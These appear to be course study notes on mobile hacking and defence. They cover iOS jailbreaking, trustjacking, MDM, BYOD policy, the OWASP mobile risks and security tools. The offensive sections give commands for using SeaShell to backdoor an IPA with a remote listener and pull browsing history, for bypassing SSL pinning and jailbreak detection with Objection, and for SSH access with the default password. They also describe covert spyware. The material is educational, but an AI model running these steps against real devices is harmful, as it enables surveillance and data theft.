- **Phone Tracker and GPS Location**
- **Mobile Tracker for Android**
- **Lost Phone Tracker**
- **Phone Tracker By Number**

---

### **Android Vulnerability Scanners**

#### **Quixxi App Shield**
- **Source:** [Quixxi](https://quixxi.com)
- Protects mobile apps against:
  - Piracy, intellectual property theft, and user data loss.
  - Hacking, cracking, and tampering.
- Utilizes multi-layered encryption to prevent reverse engineering and unauthorized modification.

#### **Additional Vulnerability Scanners:**
1. **Android Exploits** ([Play Store](https://play.google.com))
2. **ImmuniWeb® MobileSuite** ([ImmuniWeb](https://www.immuniweb.com))
3. **Yaazhini** ([Vegabird](https://www.vegabird.com))
4. **Vulners Scanner** ([Play Store](https://play.google.com))

---

### **Static Analysis of Android APKs**

Static analysis involves examining APK code without executing the app to detect malicious features, vulnerabilities, and outdated libraries.

#### **Using Mobile Security Framework (MobSF):**
- **Source:** [GitHub](https://github.com)
- **Capabilities:**
  - Performs static and dynamic analyses of APKs, XAPKs, APPXs, and IPAs.
  - Detects malicious behavior by extracting information like permissions, activities, and certificates.

**Steps to Analyze APKs with MobSF:**
1. Open a browser and upload the APK to [MobSF Live](https://mobsf.live/).
2. Review the dashboard for information such as application hash, components, and permissions.
3. Download or print a complete analysis report.

#### **Online Android Analyzers:**
1. **Sixo Online APK Analyzer** ([Sisik](https://sisik.eu))
2. **ShenmeApp** ([ShenmeApp](https://www.shenmeapp.com))
3. **KOODOUS** ([KOODOUS](https://koodous.com))
4. **Android APK Decompiler** ([Java Decompilers](http://www.javadecompilers.com))
5. **Hybrid Analysis** ([Hybrid Analysis](https://www.hybrid-analysis.com))
6. **DeGuard** ([DeGuard](http://apk-deguard.com))

---

### **Hacking iOS**

#### **Apple iOS Overview**
- iOS is Apple’s proprietary mobile OS for devices like iPhones, iPads, and Apple TVs.
- Provides secure, native app support through a layered architecture:
  1. **Cocoa Application:** Supports app infrastructure, multitasking, notifications, and input.
  2. **Media:** Offers graphics, audio, and video technologies for multimedia.
  3. **Core Services:** Provides system-level services, such as networking, iCloud, and location.
  4. **Core OS:** Contains security and hardware communication features.
  5. **Kernel and Device Drivers:** Supports file systems, networking, and infrastructure technologies.

---

### **Android Static Analysis vs. iOS Security**
- **Android:** Open-source, widely targeted due to app vulnerability, relies on tools like MobSF and online analyzers for APK analysis.
- **iOS:** Closed ecosystem, relies on strict app review processes, but still vulnerable to advanced attacks targeting system layers and architecture.

### **Jailbreaking iOS**

Jailbreaking is the process of bypassing the user restrictions imposed by Apple on its iOS devices, enabling users to install third-party apps, modify the OS, and gain administrative privileges. It involves modifying the iOS system kernels and is primarily used to access features and applications not available in the official Apple ecosystem.

---

### **Key Features and Risks of Jailbreaking**
1. **Features:**
   - Root access to the OS.
   - Removal of sandbox restrictions.
   - Installation of third-party apps, themes, and tweaks.
   - Bypassing App Store restrictions via sideloading.

2. **Risks:**
   - Voids device warranty.
   - Poor performance and vulnerability to malware.
   - Risk of "bricking" the device.

---

### **Types of Jailbreaking**

1. **Userland Exploit:**
   - Exploits system application vulnerabilities.
   - Provides user-level access but not iBoot-level access.
   - Can be patched with firmware updates.

2. **iBoot Exploit:**
   - Exploits the iBoot bootloader to delink code-signing.
   - Grants both user-level and iBoot-level access.
   - Semi-tethered for devices with new bootroms.
   - Patched via firmware updates.

3. **Bootrom Exploit:**
   - Exploits SecureROM (the first bootloader) to bypass signature checks.
   - Allows user-level and iBoot-level access.
   - Cannot be patched by firmware updates, only hardware updates.

---

### **Jailbreaking Techniques**

1. **Untethered Jailbreaking:**
   - Kernel remains patched after each reboot without needing a computer.

2. **Semi-Tethered Jailbreaking:**
   - Device boots normally but requires a computer to enable jailbreak features after reboot.

3. **Tethered Jailbreaking:**
   - Device requires a computer to boot into a usable state with a patched kernel.

4. **Semi-Untethered Jailbreaking:**
   - Similar to semi-tethered but allows the kernel to be patched directly using an installed app on the device.

---

### **Tools for Jailbreaking iOS**
1. **Hexxa Plus:**  
   - Jailbreak repo extractor for installing themes, tweaks, and apps without untethered methods.  
   - **Steps to Install:**
     - Download from the Xookz App Store.
     - Install the configuration profile.
     - Extract repos and install jailbreak apps via the Hexxa Plus Repo Extractor.

2. **Redensa:**  
   - Includes iTerminal for easier installation of jailbreak tweaks.  
   - Supports iOS 17 and above.

3. **Other Tools:**
   - **checkra1n** ([checkra.in](https://checkra.in))
   - **palera1n** ([palera.in](https://palera.in))
   - **Zeon** ([zeon-app.com](https://zeon-app.com))
   - **Sileo** ([sileem.com](https://en.sileem.com))
   - **Cydia** ([cydiafree.com](https://www.cydiafree.com))

---

### **Hacking iOS Devices**

Attackers exploit vulnerabilities in iOS devices using tools and techniques that penetrate various layers of iOS security. This may include spyware, Trojans, and exploit chain tools.

#### **Spyzie Tool:**
- **Source:** [spyzie.io](https://spyzie.io)  
- **Capabilities:**
  - Remote hacking of SMS, call logs, app chats, and GPS.
  - Operates in invisible mode, even without jailbreaking.

#### **Other Exploit Methods:**
- Installation of malicious apps.
- Exploit chains targeting security vulnerabilities across iOS layers.

---

### **iOS Trustjacking**

Trustjacking exploits the **"iTunes Wi-Fi Sync"** feature to remotely access sensitive information on an iOS device without the victim's knowledge. 

**Mechanism:**
1. **Setup:**
   - Victim connects their device to a trusted computer infected by an attacker.
   - A dialog box prompts the victim to select "Trust" or "Don’t Trust."
   - Upon clicking "Trust," the computer establishes a connection to the device.
2. **Exploitation:**
   - Once the connection is established and iTunes Wi-Fi Sync is enabled, the attacker can:
     - Monitor device activity remotely.
     - Access messages, emails, and sensitive data.
     - Replace apps with malicious versions.
     - Backup or restore the device to extract deleted data like SMS history or photos.
3. **Persistence:**
   - The connection remains active until the victim resets the connection settings, even if the devices are physically disconnected.

---

### **Post-Exploitation Using SeaShell Framework**

SeaShell is an iOS post-exploitation framework that enables attackers to exploit **CoreTrust vulnerabilities** for unauthorized software execution and remote control of compromised devices.

**Steps to Use SeaShell:**
1. Launch the framework:
   ```bash
   seashell
   ```
2. Patch an IPA file with the attacker’s IP and port:
   ```bash
   ipa patch Instagram.ipa
   ```
3. Start a TCP listener on the specified host and port:
   ```bash
   listener on <IP address> <Port no>
   ```
4. Establish remote interaction with the target device:
   ```bash
   devices -i <id>
   ```
5. Access sensitive information, such as web browsing history:
   ```bash
   safari_history
   ```

---

### **Analyzing and Manipulating iOS Applications**

Attackers analyze and manipulate iOS apps to identify and exploit vulnerabilities.

#### **Static and Dynamic Analysis:**
- **Static Analysis:** Reviews app code without execution to detect vulnerabilities like hard-coded sensitive data, bugs, and backdoors.
- **Dynamic Analysis:** Monitors runtime behavior, memory states, and variables to identify errors or unexpected behaviors.

#### **Manipulating Applications with Cycript:**
- **Cycript:** A runtime manipulation tool combining JavaScript and Objective-C for real-time code modification.
- **Capabilities:**
  - Authentication bypass.
  - Jailbreak detection bypass.
  - Method swizzling for customized functionality.

**Steps for Method Swizzling:**
1. Identify the method selector reference.
2. Create a custom method with the desired functionality.
3. Replace the original method with the custom one during runtime.

---

### **Extracting Secrets Using Keychain Dumper**

The **Keychain Dumper** tool is used to extract sensitive data like passwords and encryption keys from the iOS keychain.

**Mechanism:**
- Exploits wildcard entitlements in older iOS versions to dump keychain data.
- For recent iOS versions, attackers add explicit entitlements matching the device’s security settings.

---

### **Analyzing and Hooking iOS Applications Using Objection**

**Objection** is a tool for runtime method hooking, SSL pinning bypass, and application patching. It leverages Frida for interactive debugging and manipulation.

**Steps for Method Hooking:**
1. Attach the objection tool to the target app:
   ```bash
   objection --gadget <AppName> explore
   ```
2. Monitor method calls:
   ```bash
   ios hooking watch class <Class_Name>
   ```
3. Hook a specific method:
   ```bash
   ios hooking watch method "-[Class_Name Method_Name]"
   ```
4. Modify return values:
   ```bash
   ios hooking set return_value "-[Class_Name iFunction_Name:]" true/false
   ```

**Bypass Techniques:**
- Disable SSL pinning:
  ```bash
  ios sslpinning disable
  ```
- Disable jailbreak detection:
  ```bash
  ios jailbreak disable
  ```

---

### **Key Takeaways**
- Trustjacking and tools like SeaShell and Cycript exploit iOS vulnerabilities for remote access and manipulation.
- Static and dynamic analysis techniques help attackers uncover vulnerabilities in iOS applications.
- Tools like **Keychain Dumper** and **Objection** enable sensitive data extraction and runtime modification. 

### **Analyzing iOS Devices**

Analyzing iOS devices is a critical step for identifying vulnerabilities, understanding system architecture, and uncovering exploitable weaknesses. This helps attackers craft targeted attacks and bypass security controls to access sensitive data or system functionalities.

---

### **Techniques for Analyzing iOS Devices**

1. **Accessing the Device Shell:**
   - **Purpose:** Execute arbitrary commands and manipulate system settings.
   - **Methods:**
     - **Via SSH over Wi-Fi:**
       - Install the OpenSSH package on the device.
       - Run the command: 
         ```bash
         ssh root@<device_ip_address>
         ```
       - Default username: `root` or `mobile`, password: `alpine`.
     - **Via USB:** 
       - Use tools like `iproxy` to establish a connection:
         ```bash
         ssh -p 2222 root@localhost
         ```

2. **Listing Installed Apps:**
   - **Purpose:** Identify apps for further analysis.
   - **Tool:** Frida.
   - **Command:** 
     ```bash
     frida-ps -Uai
     ```

3. **Network Sniffing:**
   - **Purpose:** Monitor and analyze network traffic in real time.
   - **Steps:**
     - Connect the device to a macOS system via USB.
     - Create a virtual interface:
       ```bash
       rvictl -s <UDID>
       ```
     - Use Wireshark with the `rvi0` interface to capture traffic.
     - Filter specific traffic, e.g.:
       ```bash
       ip.addr == 192.168.2.4 && http
       ```

4. **Open Connections:**
   - **Purpose:** Identify active network sessions and intercept data.
   - **Commands:**
     - List open network ports:
       ```bash
       lsof -i
       ```
     - List open ports for a specific process:
       ```bash
       lsof -i -a -p <pid>
       ```

5. **Process Exploration:**
   - **Purpose:** Investigate app memory for sensitive data.
   - **Tools:** r2frida, iGoat-Swift.
   - **Commands:**
     - Start r2frida session:
       ```bash
       r2 frida://usb//iGoat-Swift
       ```
     - Retrieve memory maps:
       ```bash
       :dm
       ```
     - List loaded binaries and libraries:
       ```bash
       :il
       ```

---

### **iOS Malware**

#### **GoldPickaxe Trojan:**
- **Functionality:**
  - Delivered via phishing or smishing messages.
  - Exploits MDM profiles to remotely configure devices.
  - Collects data like photos of IDs, face scans, and bank account details.

#### **Other Malware:**
- **SpectralBlur:** Targets app vulnerabilities.
- **Mercenary Spyware:** Advanced spying tools.
- **LightSpy:** Monitors device activity.
- **KingsPawn:** Exploits app flaws.
- **Pegasus:** Highly sophisticated spyware for state-level surveillance.

---

### **iOS Hacking Tools**

1. **Elcomsoft Phone Breaker:**
   - Extracts iCloud data, decrypts iOS backups, and analyzes Apple Keychain.
   - Breaks encryption using GPU acceleration.

2. **Other Tools:**
   - **Enzyme:** Security analyzer.
   - **Network Analyzer:** Monitors network activity.
   - **Frida:** Method hooking and runtime app manipulation.
   - **iOS Binary Security Analyzer:** Static analysis.
   - **iWepPRO:** Network penetration testing.

---

### **Securing iOS Devices**

To protect iOS devices from attacks, users should adopt the following measures:

1. **Access Control:**
   - Enable passcode lock and Face/Touch ID.
   - Use strong, separate passcodes for sensitive apps.
   - Disable lock screen notifications:
     ```bash
     Settings → Notifications → Show Previews → Never
     ```

2. **Network Security:**
   - Use only secured Wi-Fi networks.
   - Enable "Ask to Join Networks" to avoid untrusted connections:
     ```bash
     Settings → Wi-Fi → Ask to Join Networks
     ```

3. **App Management:**
   - Download apps exclusively from the Apple App Store.
   - Update apps automatically:
     ```bash
     Settings → App Store → Automatic Downloads → App Updates
     ```

4. **Data Protection:**
   - Enable full-disk encryption.
   - Configure **Find My iPhone** for remote wiping:
     ```bash
     Settings → [Your Name] → Find My → Find My iPhone
     ```
   - Use MDM for enterprise environments.

5. **Privacy Enhancements:**
   - Disable geotagging for photos:
     ```bash
     Settings → Privacy & Security → Location Services → Camera → Never
     ```
   - Enable **Do Not Track** in Safari:
     ```bash
     Settings → Safari → Do Not Track
     ```

6. **General Security:**
   - Avoid jailbreaking or rooting.
   - Reset network settings if suspicious activity is detected:
     ```bash
     Settings → General → Transfer or Reset → Reset → Reset Network Settings
     ```
   - Use VPN software to encrypt internet traffic.

7. **Malware Prevention:**
   - Disable JavaScript in browsers for added protection.
   - Use vault apps to secure sensitive data.

---

### **iOS Device Security Tools**

1. **Malwarebytes Mobile Security:**
   - **Source:** [Malwarebytes](https://www.malwarebytes.com)
   - **Features:**
     - Blocks intrusive ads in Safari and prevents ad tracking.
     - Filters suspicious text messages into separate folders.
     - Blocks fraudulent calls, phishing sites, and malicious content.
     - Includes a VPN for encrypted connections and enhanced online privacy.

2. **Additional Security Tools:**
   - **Norton Mobile Security for iOS** ([Norton](https://us.norton.com))
   - **McAfee Mobile Security** ([McAfee](https://www.mcafee.com))
   - **Trend Micro Mobile Security** ([Trend Micro](https://www.trendmicro.com))
   - **AVG Mobile Security** ([AVG](https://www.avg.com))
   - **Kaspersky Standard** ([Kaspersky](https://www.kaspersky.com))

---

### **iOS Device Tracking Tools**

1. **Find My:**
   - **Source:** [Apple Support](https://support.apple.com)
   - **Features:**
     - Tracks lost or misplaced devices (iPhone, iPad, Mac) via another iOS device.
     - Allows remote locking, sound playing, and data erasing.
     - Includes **Lost Mode** for passcode protection and location tracking.

   **Setup Steps:**
   - Open `Settings → [your name] → Find My`.
   - Turn on **Find My [device]**, **Find My network**, and **Send Last Location**.

2. **Additional Tracking Tools:**
   - **Glympse En Route** ([Glympse](https://corp.glympse.com))
   - **Prey Find My Phone & Security** ([Prey](https://apps.apple.com))
   - **Mobile Phone Tracker Pro** ([Apple Store](https://apps.apple.com))
   - **FollowMee GPS Location Tracker** ([Apple Store](https://apps.apple.com))
   - **Phone Tracker: GPS Location** ([Apple Store](https://apps.apple.com))

---

### **Mobile Device Management (MDM)**

**Purpose:**
- MDM ensures secure, monitored, and managed usage of mobile devices (company-owned or BYOD) within an enterprise.

**Features:**
- Enforces passcode requirements.
- Remotely locks or wipes devices.
- Detects rooted or jailbroken devices.
- Implements enterprise-wide policies.
- Provides real-time monitoring and reporting.

---

### **MDM Solutions**

1. **Scalefusion MDM:**
   - **Source:** [Scalefusion](https://scalefusion.com)
   - **Features:**
     - Comprehensive visibility and control for IT teams.
     - Manages and secures diverse devices (Android, iOS, macOS, Windows).
     - Enhances employee productivity with seamless endpoint management.

2. **Additional MDM Solutions:**
   - **ManageEngine Mobile Device Manager Plus** ([ManageEngine](https://www.manageengine.com))
   - **Microsoft Intune** ([Microsoft](https://www.microsoft.com))
   - **SOTI MobiControl** ([SOTI](https://soti.net))
   - **AppTec360** ([AppTec](https://www.apptec360.com))
   - **Jamf Pro** ([Jamf](https://www.jamf.com))

---

### **Bring Your Own Device (BYOD)**

BYOD policies enable employees to use their personal devices (smartphones, laptops, tablets) for work purposes, offering flexibility and productivity benefits while posing security challenges.

---

### **Benefits of BYOD**

1. **Increased Productivity:**
   - Employees are familiar with their devices, leading to greater efficiency.
   - Organizations benefit from the latest device technologies without direct investment.

2. **Employee Satisfaction:**
   - Employees use devices of their choice, eliminating the need for multiple devices.
   - Combines personal and professional data, improving convenience.

3. **Work Flexibility:**
   - Facilitates remote work with access to corporate data from anywhere.
   - Replaces traditional models with mobile and cloud-centric strategies.

4. **Lower Costs:**
   - Reduces corporate spending on devices and data services.
   - Employees take better care of their devices, reducing maintenance costs.

---

### **Risks of BYOD**

1. **Data Leakage:**
   - Unsecured public networks can expose corporate data to unauthorized access.
   - Lost or stolen devices risk sensitive corporate information.

2. **Endpoint Security:**
   - Mixing personal and corporate data can lead to privacy and security issues.
   - Rooted or jailbroken devices increase vulnerability.

3. **Device Diversity:**
   - Multiple platforms and OS versions complicate IT management and security.

4. **Infrastructure Challenges:**
   - Supporting different devices and technologies increases operational complexity.

5. **Disgruntled Employees:**
   - Employees leaving the company may misuse corporate data or expose it to competitors.

6. **Inadequate Backup and Updates:**
   - Personal devices often lack proper data backup and timely software updates.

7. **Shadow IT:**
   - Unauthorized cloud services can limit IT oversight and increase risks.

---

### **BYOD Policy Implementation Principles**

1. **Define Requirements:**
   - Segment users based on job needs, data access, and mobility.
   - Conduct Privacy Impact Assessments (PIA) to address risks and solutions.

2. **Select Devices and Build Technology Portfolio:**
   - Choose devices that meet organizational security requirements.
   - Use MDM and additional tools for enhanced security.

3. **Develop Policies:**
   - Define clear acceptable-use policies, including:
     - Information security and data protection measures.
     - Wi-Fi security guidelines and termination procedures.
     - App usage and monitoring policies.

4. **Security Measures:**
   - Implement strong encryption, access controls, and network security.
   - Assess risks in data, operations, and transmission security.

5. **Support Infrastructure:**
   - Establish support processes for different devices and platforms.
   - Use mobile committees to reassess policies and ensure productivity.

---

### **BYOD Security Guidelines**

#### **For Administrators:**
- Enforce **multi-factor authentication** for access.
- Prohibit jailbroken or rooted devices.
- Use **EMM systems** for real-time device monitoring.
- Implement **containerization** to separate corporate and personal data.
- Enable **remote wipe** and lock capabilities for lost or stolen devices.
- Regularly update software and conduct security audits.
- Control app installations through whitelisting or blacklisting.

#### **For Employees:**
- Use **encryption** to secure stored data.
- Regularly update the device OS and security patches.
- Avoid downloading apps or files from untrusted sources.
- Use strong passcodes and biometric authentication.
- Separate corporate and personal data storage.
- Report lost or stolen devices to IT immediately.
- Avoid synchronizing corporate data with personal devices or cloud services.
- Install tracking software for device recovery.

---

### **Key Features of MDM for BYOD**

1. **Device Management:**
   - Remotely lock, wipe, or update devices.
   - Monitor and enforce security policies.

2. **Data Security:**
   - Detect rooted or jailbroken devices.
   - Use encryption for data storage and transmission.

3. **Policy Enforcement:**
   - Enforce acceptable-use policies.
   - Implement data loss prevention (DLP) measures.

4. **Support and Maintenance:**
   - Provide real-time monitoring and reporting.
   - Manage device compatibility and updates.

---

### **BYOD Tools**

1. **MDM Solutions:**
   - **Scalefusion MDM** ([Scalefusion](https://scalefusion.com))
   - **ManageEngine Mobile Device Manager Plus** ([ManageEngine](https://www.manageengine.com))
   - **Microsoft Intune** ([Microsoft](https://www.microsoft.com))

2. **Security Software:**
   - **Malwarebytes Mobile Security**
   - **Norton Mobile Security**
   - **McAfee Mobile Security**

---

### **Mobile Security Guidelines and Tools**

Mobile devices are essential tools for personal and professional use, but they are also susceptible to numerous security threats. Following strict guidelines and leveraging security tools can significantly reduce risks.

---

### **OWASP Top 10 Mobile Risks and Solutions**

1. **Improper Credential Usage:**
   - Avoid hardcoded credentials; use encrypted, revocable access tokens.
   - Implement secure user authentication protocols and code reviews.

2. **Inadequate Supply Chain Security:**
   - Use trusted third-party components and secure app signing processes.
   - Monitor updates, patches, and security incidents.

3. **Insecure Authentication/Authorization Usage:**
   - Use robust authentication mechanisms like biometrics (Face ID, Touch ID).
   - Validate roles and permissions; avoid weak authentication patterns.

4. **Insufficient Input/Output Validation:**
   - Implement strict validation techniques and data integrity checks.
   - Conduct regular security assessments.

5. **Insecure Communication:**
   - Use SSL/TLS, certificate pinning, and secure endpoints.
   - Avoid plaintext data transmission and insecure channels like SMS.

6. **Inadequate Privacy Controls:**
   - Protect sensitive data with authentication and authorization.
   - Use tools to detect data leakage and employ obfuscation techniques.

7. **Insufficient Binary Protections:**
   - Perform integrity checks and secure default configurations.
   - Use tamper detection and prevention techniques.

8. **Security Misconfiguration:**
   - Avoid overly permissive file permissions and hardcoded credentials.
   - Use HTTPS, encryption, and proper access controls.

9. **Insecure Data Storage:**
   - Encrypt sensitive data and store it in secure locations.
   - Use secure session management and key management practices.

10. **Insufficient Cryptography:**
    - Adhere to cryptographic best practices (e.g., SHA-256, PBKDF2).
    - Avoid custom cryptographic implementations.

---

### **General Mobile Security Guidelines**

#### **Device Configuration:**
- **Passcodes and Authentication:**
  - Use strong, complex passcodes and enable biometric authentication.
  - Set idle timeouts and enable device lockout after repeated failed attempts.
- **Encryption:**
  - Encrypt device storage and backups.
  - Use secure data transfer protocols like HTTPS or VPNs.

#### **Software and Applications:**
- Install apps only from trusted sources.
- Regularly update the OS and apps to patch vulnerabilities.
- Limit app permissions to only what is necessary.

#### **Network Usage:**
- Avoid connecting to public Wi-Fi without a VPN.
- Disable unused features like Bluetooth and NFC to reduce attack vectors.

#### **Data Management:**
- Separate personal and corporate data on devices.
- Regularly back up sensitive data securely.
- Use remote wipe services to erase data from lost or stolen devices.

#### **Behavioral Practices:**
- Avoid jailbreaking or rooting devices, as this weakens security.
- Disable auto-upload of photos and GPS sharing unless necessary.
- Regularly log out from sensitive apps and services.

#### **Browser and Notifications:**
- Harden browser permissions; disable autofill for sensitive fields.
- Disable notifications for sensitive apps on the lock screen.

---

### **Mobile Security Tools**

1. **Anti-Malware Tools:**
   - **Malwarebytes Mobile Security** ([Malwarebytes](https://www.malwarebytes.com))
   - **Kaspersky Antivirus** ([Kaspersky](https://www.kaspersky.com))
   - **McAfee Mobile Security** ([McAfee](https://www.mcafee.com))

2. **Remote Management Tools:**
   - **Find My Device** (Android)
   - **Find My iPhone** (iOS)

3. **Encryption and Backup Tools:**
   - Use native device encryption features.
   - Secure backups with over-the-air tools and ensure they are encrypted.

4. **VPN and Secure Communication Tools:**
   - **ExpressVPN**, **NordVPN**, and similar services for encrypted connections.
   - Use tools like **TLS** to ensure secure communication protocols.

5. **Mobile Device Management (MDM):**
   - Employ MDM solutions for enterprise environments:
     - **Scalefusion MDM** ([Scalefusion](https://scalefusion.com))
     - **Microsoft Intune** ([Microsoft](https://www.microsoft.com))

6. **Email and Data Filtering Tools:**
   - Use DLP filters to prevent sensitive data from being emailed or shared.
   - Enable server-side filtering for corporate email systems.

---

### **Key Takeaways**

- Secure mobile devices by following a multi-layered approach: strong authentication, encryption, secure app practices, and regular updates.
- Use specialized tools for malware protection, secure communication, and device management.
- Educate users on safe behaviors and implement strict organizational policies for BYOD and corporate devices.

### **Mobile Device Security Guidelines for Administrators**

Administrators play a vital role in safeguarding corporate mobile devices and sensitive data. Here are comprehensive security guidelines and recommendations:

---

### **Corporate Policies**
1. **BYOD and Cloud Policies:**
   - Define acceptable use for personal devices (BYOD) and access to cloud resources.
   - Specify acceptable applications and prohibited data access levels.

2. **Access and Authentication:**
   - Implement session timeouts and secure authentication methods (e.g., SMS, RSA SecurID).
   - Specify whether domain passwords can be cached or require entry for every access.

3. **Mobile Device Security Policy:**
   - Clearly state allowed device types, access privileges, and security requirements.
   - Regularly update policies to reflect evolving security risks.

4. **Security Settings and Testing:**
   - Enable required settings before issuing devices (e.g., encryption, remote wipe).
   - Test solutions for security, functionality, and performance before deployment.

---

### **Security Measures**
1. **Unified Management:**
   - Employ **Unified Endpoint Management (UEM)** to extend control over all endpoints.
   - Use **Mobile Threat Defense (MTD)** for advanced features like behavior analysis.

2. **Access Control:**
   - Restrict access to public Wi-Fi networks using management consoles.
   - Utilize **Cloud Access Security Brokers (CASB)** for monitoring and protection.

3. **Device and Data Protection:**
   - Enforce encryption for data at rest and in transit.
   - Standardize device configurations and disable unnecessary features.
   - Implement **Application Protection Policies (APP)** to prevent local storage of sensitive data.

4. **Incident Response:**
   - Securely erase data before decommissioning devices.
   - Use remote wipe and lock capabilities for lost or stolen devices.

---

### **Advanced Security Techniques**
1. **Authentication and Authorization:**
   - Use multi-factor authentication (MFA) to enhance security.
   - Leverage biometrics (fingerprint, facial recognition) for secure access.

2. **Monitoring and Threat Detection:**
   - Perform real-time monitoring for policy compliance.
   - Use endpoint security solutions to detect and alert on risks.

3. **Data Loss Prevention (DLP):**
   - Implement policies to prevent unauthorized data sharing or storage.
   - Use sandboxing or containerization to separate corporate and personal data.

---

### **Countermeasures Against SMS Phishing**
1. **User Practices:**
   - Avoid replying to suspicious SMS or clicking links.
   - Verify sender authenticity and review official communication policies.

2. **Technical Measures:**
   - Enable "block texts from the internet" and anti-phishing software.
   - Ensure up-to-date anti-malware software on devices.

3. **Organizational Steps:**
   - Conduct phishing simulations to educate employees.
   - Use official short codes for communications.

---

### **Countermeasures Against OTP Hijacking**
1. **For Users:**
   - Use strong, unique passwords and enable SIM locking.
   - Manually enter OTPs and avoid forwarding them.

2. **For Developers:**
   - Transmit OTPs over encrypted channels.
   - Combine OTPs with biometric or hardware-based authentication.

---

### **Recommendations for Secure Data Storage**
#### **Android (KeyStore):**
- Use hardware-backed KeyStore for encryption and authentication mechanisms.
- Ensure keys are stored securely and accessed only after proper authentication.
- Encrypt data in SharedPreferences and avoid hardcoding sensitive information.

#### **iOS (Keychain):**
- Leverage hardware-backed AES encryption and ACLs for access control.
- Erase keychain data upon app uninstallation to prevent unauthorized access.
- Securely manage interprocess communication (IPC) and app extensions.

---

### **Reverse Engineering Mobile Applications**

Reverse engineering of mobile applications involves analyzing and extracting the source code of software or mobile apps for purposes such as vulnerability assessment, debugging, and compliance verification. It is a key technique in mobile security, enabling professionals to detect flaws, understand app behaviors, and enhance security measures.

---

### **Uses of Reverse Engineering**
1. **Code Analysis:**
   - Understanding and reading source code for insights into app design and functionality.
   - Scanning for sensitive information, such as hardcoded credentials, encryption keys, and APIs.

2. **Vulnerability Detection:**
   - Identifying flaws like insecure data storage, improper authentication, and misconfigurations.

3. **Malware Analysis:**
   - Dissecting malicious code to understand behavior, attack vectors, and payloads.

4. **Debugging and Troubleshooting:**
   - Locating and fixing bugs in mobile applications to optimize performance.

5. **Regeneration and Modification:**
   - Rebuilding the application with required updates or security fixes.
   - Creating modified versions (clones) of apps.

6. **Compliance and Auditing:**
   - Verifying adherence to security standards like GDPR, HIPAA, or OWASP.
   - Detecting vulnerable third-party libraries.

---

### **Key Reasons for Reverse Engineering**
1. **Security Analysis:**
   - Helps uncover vulnerabilities, understand communication protocols, and analyze malware.

2. **Black-Box Testing:**
   - Neutralizing controls like SSL pinning, root detection, and encryption to enable dynamic analysis.

3. **Resilience Assessment:**
   - Evaluating the effectiveness of anti-reversing measures, such as obfuscation and encryption.

4. **Compliance Verification:**
   - Inspecting application code to ensure security standards are met and components are compliant.

---

### **Reverse Engineering Tools**
1. **Apktool**  
   - **Source:** [apktool.org](https://apktool.org)  
   - **Features:**
     - Disassembling and rebuilding Android APKs.
     - Debugging Smali code.
     - Supporting framework-dependent APKs.  

2. **Androguard**  
   - **Source:** [GitHub](https://github.com)  
   - A reverse engineering tool for analyzing Android apps. It supports static and dynamic analysis of APKs.

3. **Frida**  
   - **Source:** [frida.re](https://www.frida.re)  
   - A dynamic instrumentation toolkit for Android and iOS apps, allowing runtime code modification.

4. **JEB Decompiler**  
   - **Source:** [pnfsoftware.com](https://www.pnfsoftware.com)  
   - A powerful reverse engineering platform supporting Android and iOS apps.

5. **APK Editor Studio**  
   - **Source:** [GitHub](https://github.com)  
   - A GUI tool for modifying APK files, focusing on resources and manifest editing.

6. **Bytecode Viewer**  
   - **Source:** [GitHub](https://github.com)  
   - A tool for viewing and editing bytecode in Android apps.

---

### **Source Code Analysis Tools**
1. **Syhunt Mobile**  
   - **Source:** [syhunt.com](https://www.syhunt.com)  
   - **Features:**
     - Performs over 350 vulnerability checks for Android and 240+ for iOS.
     - Supports languages like Java, Swift, Objective-C, and C.
     - Scans apps for OWASP Mobile Top 10 vulnerabilities.

2. **Android Lint**  
   - **Source:** [android.com](https://www.android.com)  
   - Detects code smells and potential errors in Android apps.

3. **Zimperium z3A**  
   - **Source:** [zimperium.com](https://www.zimperium.com)  
   - Mobile app analysis and threat detection tool.

4. **Appium**  
   - **Source:** [appium.io](https://appium.io)  
   - An open-source tool for testing Android and iOS apps.

5. **Infer**  
   - **Source:** [fbinfer.com](https://fbinfer.com)  
   - A static analysis tool for finding bugs in Java, Objective-C, and C++ apps.

---

### **App Repackaging Detectors**

Repackaging detection tools are critical for identifying and preventing the unauthorized modification of legitimate applications. They help ensure the integrity of apps by detecting malicious modifications, preventing unauthorized distribution, and protecting users from counterfeit applications.

#### **Tools for Detecting Repackaged Apps**
1. **Appdome**  
   - **Source:** [appdome.com](https://www.appdome.com)  
   - **Features:**
     - Provides Runtime Application Self-Protection (RASP) for Android and iOS apps.
     - Prevents app tampering, reverse engineering, method hooking, and repackaging.
     - Ensures mobile app integrity using checksum validation and anti-fraud/malware features.

2. **freeRASP for Android/iOS**  
   - **Source:** [GitHub](https://github.com)  
   - Offers an open-source runtime application self-protection library to safeguard mobile apps.

3. **wultra**  
   - **Source:** [wultra.com](https://www.wultra.com)  
   - Focuses on app shielding and runtime integrity verification.

4. **iXGuard**  
   - **Source:** [GuardSquare](https://www.guardsquare.com)  
   - Specializes in code obfuscation and app security to prevent reverse engineering and tampering.

5. **AndroCompare**  
   - **Source:** [GitHub](https://github.com)  
   - Compares APKs to detect unauthorized modifications.

6. **FSquaDRA 2**  
   - **Source:** [GitHub](https://github.com)  
   - An open-source Android repackaging detection tool.

---

### **Mobile Protection Tools**

Mobile protection tools enhance device security by protecting against malware, spyware, and unauthorized access. They often provide features such as real-time threat detection, secure browsing, and privacy management.

#### **Notable Mobile Protection Tools**
1. **Avast Antivirus & Security**  
   - **Source:** [Google Play](https://play.google.com)  
   - Provides automated scans, Wi-Fi security checks, and malware detection.

2. **Comodo Mobile Security**  
   - **Source:** [comodo.com](https://www.comodo.com)  
   - Offers features like malware protection, safe browsing, VPN, and app locking.

3. **AVG Mobile Security**  
   - **Source:** [avg.com](https://www.avg.com)  
   - Ensures protection against malware, spyware, and Wi-Fi threats.

4. **Bitdefender Mobile Security**  
   - **Source:** [Google Play](https://play.google.com)  
   - Provides anti-phishing, privacy monitoring, and secure web browsing.

5. **ESET Mobile Security Antivirus**  
   - **Source:** [Google Play](https://play.google.com)  
   - Offers proactive anti-malware and anti-theft features.

---

### **Mobile Anti-Spyware Tools**

These tools help protect against spyware, ensuring user privacy by detecting and removing malicious software designed to steal sensitive data.

#### **Popular Anti-Spyware Tools**
1. **TotalAV**  
   - **Source:** [totalav.com](https://www.totalav.com)  
   - Detects and prevents spyware, malware, and adware.

2. **Certo Anti Spyware**  
   - **Source:** [Google Play](https://play.google.com)  
   - Detects and removes spyware from Android devices.

3. **iAmNotified - Anti Spy System**  
   - **Source:** [iamnotified.com](https://iamnotified.com)  
